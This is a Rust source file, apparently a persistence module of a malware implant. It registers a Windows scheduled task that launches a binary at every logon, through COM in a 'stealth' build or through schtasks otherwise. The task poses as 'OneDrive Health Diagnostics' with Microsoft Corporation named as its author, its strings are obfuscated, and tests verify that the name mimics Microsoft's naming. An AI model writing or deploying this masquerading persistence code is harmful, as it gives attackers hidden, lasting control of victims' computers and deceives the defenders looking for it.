use crate::persistence::PersistenceTrait;
use std::path::Path;

pub struct ScheduledTaskPersistence;

const TASK_NAME: &str = "OneDrive Health Diagnostics";
const TASK_CACHE_KEY: &str =
    r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\OneDrive Health Diagnostics";

// ── ITaskService implementation (stealth feature, Windows only) ──────────────

#[cfg(all(target_os = "windows", feature = "stealth"))]
impl PersistenceTrait for ScheduledTaskPersistence {
    fn install(&self, binary_path: &Path) -> anyhow::Result<()> {
        use windows::{
            core::{Interface, BSTR, VARIANT},
            Win32::System::Com::{
                CoCreateInstance, CoInitializeEx, CoUninitialize,
                CLSCTX_ALL, COINIT_MULTITHREADED,
            },
            Win32::System::TaskScheduler::{
                IActionCollection, IExecAction, ILogonTrigger,
                IPrincipal, IRegistrationInfo, ITaskFolder,
                ITaskDefinition, ITaskService, ITriggerCollection,
                TASK_ACTION_EXEC, TASK_CREATE_OR_UPDATE,
                TASK_LOGON_INTERACTIVE_TOKEN, TASK_RUNLEVEL_LUA,
                TASK_TRIGGER_LOGON,
            },
        };

        let exe = binary_path
            .to_str()
            .ok_or_else(|| anyhow::anyhow!("invalid path"))?;

        unsafe {
            CoInitializeEx(None, COINIT_MULTITHREADED).ok()?;
            struct ComGuard;
            impl Drop for ComGuard { fn drop(&mut self) { unsafe { CoUninitialize(); } } }
            let _guard = ComGuard;

            let null_var = VARIANT::default();

            let service: ITaskService = CoCreateInstance(
                &windows::Win32::System::TaskScheduler::TaskScheduler,
                None,
                CLSCTX_ALL,
            )?;
            service.Connect(&null_var, &null_var, &null_var, &null_var)?;

            let folder: ITaskFolder = service.GetFolder(&BSTR::from("\\"))?;
            let task: ITaskDefinition = service.NewTask(0)?;

            let reg_info: IRegistrationInfo = task.RegistrationInfo()?;
            reg_info.SetAuthor(&BSTR::from("Microsoft Corporation"))?;
            reg_info.SetDescription(
                &BSTR::from("Performs OneDrive health diagnostics.")
            )?;

            let triggers: ITriggerCollection = task.Triggers()?;
            let trigger = triggers.Create(TASK_TRIGGER_LOGON)?;
            let _: ILogonTrigger = trigger.cast()?;

            let actions: IActionCollection = task.Actions()?;
            let action = actions.Create(TASK_ACTION_EXEC)?;
            let exec_action: IExecAction = action.cast()?;
            exec_action.SetPath(&BSTR::from(exe))?;

            let principal: IPrincipal = task.Principal()?;
            principal.SetLogonType(TASK_LOGON_INTERACTIVE_TOKEN)?;
            principal.SetRunLevel(TASK_RUNLEVEL_LUA)?;

            folder.RegisterTaskDefinition(
                &BSTR::from(obfstr::obfstr!(TASK_NAME)),
                &task,
                TASK_CREATE_OR_UPDATE.0 as i32,
                &null_var,
                &null_var,
                TASK_LOGON_INTERACTIVE_TOKEN,
                &null_var,
            )?;
        }
        Ok(())
    }

    fn remove(&self) -> anyhow::Result<()> {
        use windows::{
            core::{BSTR, VARIANT},
            Win32::System::Com::{
                CoCreateInstance, CoInitializeEx, CoUninitialize,
                CLSCTX_ALL, COINIT_MULTITHREADED,
            },
            Win32::System::TaskScheduler::ITaskService,
        };
        unsafe {
            CoInitializeEx(None, COINIT_MULTITHREADED).ok()?;
            struct ComGuard;
            impl Drop for ComGuard { fn drop(&mut self) { unsafe { CoUninitialize(); } } }
            let _guard = ComGuard;
            let null_var = VARIANT::default();
            let service: ITaskService = CoCreateInstance(
                &windows::Win32::System::TaskScheduler::TaskScheduler,
                None, CLSCTX_ALL,
            )?;
            service.Connect(&null_var, &null_var, &null_var, &null_var)?;
            let folder = service.GetFolder(&BSTR::from("\\"))?;
            folder.DeleteTask(&BSTR::from(obfstr::obfstr!(TASK_NAME)), 0)?;
        }
        Ok(())
    }

    fn check(&self) -> bool {
        use winreg::{enums::HKEY_LOCAL_MACHINE, RegKey};
        RegKey::predef(HKEY_LOCAL_MACHINE)
            .open_subkey(TASK_CACHE_KEY)
            .is_ok()
    }

    fn name(&self) -> &'static str { "scheduled_task" }
}

// ── Non-stealth Windows: schtasks.exe install, winreg check ──────────────────

#[cfg(all(target_os = "windows", not(feature = "stealth")))]
impl PersistenceTrait for ScheduledTaskPersistence {
    fn install(&self, binary_path: &Path) -> anyhow::Result<()> {
        use std::process::Command;
        let s = binary_path
            .to_str()
            .ok_or_else(|| anyhow::anyhow!("invalid path"))?;
        let status = Command::new(obfstr::obfstr!("schtasks"))
            .args(["/create", "/f", "/sc", "onlogon",
                   "/tn", obfstr::obfstr!(TASK_NAME), "/tr", s])
            .status()?;
        anyhow::ensure!(status.success(), "task scheduler create failed");
        Ok(())
    }
    fn remove(&self) -> anyhow::Result<()> {
        use std::process::Command;
        let s = Command::new(obfstr::obfstr!("schtasks"))
            .args(["/delete", "/f", "/tn", obfstr::obfstr!(TASK_NAME)])
            .status()?;
        anyhow::ensure!(s.success(), "task scheduler delete failed");
        Ok(())
    }
    fn check(&self) -> bool {
        use winreg::{enums::HKEY_LOCAL_MACHINE, RegKey};
        RegKey::predef(HKEY_LOCAL_MACHINE)
            .open_subkey(TASK_CACHE_KEY)
            .is_ok()
    }
    fn name(&self) -> &'static str { "scheduled_task" }
}

// ── Non-Windows stub ──────────────────────────────────────────────────────────

#[cfg(not(target_os = "windows"))]
impl PersistenceTrait for ScheduledTaskPersistence {
    fn install(&self, _: &Path) -> anyhow::Result<()> {
        anyhow::bail!("scheduled tasks not available on this platform")
    }
    fn remove(&self) -> anyhow::Result<()> { Ok(()) }
    fn check(&self) -> bool { false }
    fn name(&self) -> &'static str { "scheduled_task" }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn task_name_mimics_microsoft_pattern() {
        assert!(TASK_NAME.contains("OneDrive"),
            "task name must mirror OneDrive pattern");
        assert!(!TASK_NAME.contains("Oxide"));
        assert!(!TASK_NAME.contains("Update"));
        assert!(!TASK_NAME.contains("Helper"));
    }

    #[test]
    fn task_cache_key_ends_with_task_name() {
        assert!(TASK_CACHE_KEY.ends_with(TASK_NAME));
        assert!(TASK_CACHE_KEY.contains("TaskCache"));
    }
}
